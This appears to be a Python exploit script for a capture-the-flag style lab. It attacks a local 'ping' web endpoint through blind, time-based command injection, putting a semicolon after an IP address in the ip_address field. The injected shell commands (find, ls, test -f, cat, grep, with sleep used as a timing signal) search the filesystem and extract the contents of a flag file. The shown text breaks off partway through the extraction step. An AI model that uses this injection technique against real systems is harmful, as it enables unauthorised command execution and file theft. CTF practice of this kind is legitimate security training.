import requests
import time
import string

# Target configuration
TARGET_URL = "http://127.0.0.1:32817/ping"
TIMEOUT = 30

def test_command(cmd):
    """Execute command and return response time"""
    payload = f"1.1.1.1;{cmd}"
    data = {"ip_address": payload}
    
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, timeout=TIMEOUT)
        elapsed = time.time() - start_time
        return elapsed
    except:
        elapsed = time.time() - start_time
        return elapsed

# Step 1: Find the actual flag file
print("[*] Step 1: Finding flag files on the system")

# Use find command with time-based detection
find_cmd = "find / -name '*flag*' -type f 2>/dev/null | head -5"
test_cmd = f"{find_cmd} | wc -l | grep -E '[0-9]+' && sleep 3"
elapsed = test_command(test_cmd)

if elapsed >= 2.5:
    print(f"[+] Found {int(elapsed-0.5)} flag files (estimated)")
    print("[+] Files matching '*flag*' exist on the system")

# Step 2: Enumerate root directory to find flag files
print("\n[*] Step 2: Enumerating root directory for flag files")

# List files in root and grep for flag
root_ls_cmd = "ls -la / | grep -i flag"
test_cmd = f"{root_ls_cmd} && sleep 3"
elapsed = test_command(test_cmd)

if elapsed >= 2.5:
    print("[+] Flag files found in root directory listing")
    
    # Try to extract the actual filename using pattern matching
    # We'll use a technique to output the filename character by character
    print("\n[*] Step 3: Extracting flag filename")
    
    # Method: Use ls and grep to find flag file, then extract it
    # Test common flag patterns
    patterns = ["/flag*", "/FLAG*", "/f*lag*", "/F*LAG*"]
    
    found_files = []
    for pattern in patterns:
        check_cmd = f"ls {pattern} 2>/dev/null | head -1 | wc -c | grep -v '^0$' && sleep 3"
        elapsed = test_command(check_cmd)
        
        if elapsed >= 2.5:
            print(f"[+] Found file matching: {pattern}")
            found_files.append(pattern)
    
    # Use character-by-character extraction for known common paths
    potential_paths = ["/flag", "/flag.txt", "/FLAG", "/FLAG.txt", "/root/flag", "/tmp/flag"]
    
    print("\n[*] Step 4: Testing common flag file paths")
    
    for path in potential_paths:
        # Check if file exists using test -f
        exists_cmd = f"test -f {path} && sleep 3"
        elapsed = test_command(exists_cmd)
        
        if elapsed >= 2.5:
            print(f"\n[+] File EXISTS: {path}")
            print(f"[*] Attempting to extract contents of: {path}")
            
            # Method 1: Check file size first
            size_cmd = f"cat {path} | wc -c"
            test_size = f"{size_cmd} | grep -E '[0-9]+' && sleep 2"
            elapsed = test_command(test_size)
            
            if elapsed >= 1.5:
                estimated_size = int(elapsed + 3)
                print(f"[+] File size: approximately {estimated_size} characters")
                
                # Method 2: Try to extract FLAG pattern directly
                # Search for FLAG{ pattern in the file
                flag_check_cmd = f"grep -o 'FLAG{{.*}}' {path} && sleep 3"
                elapsed = test_command(flag_check_cmd)
                
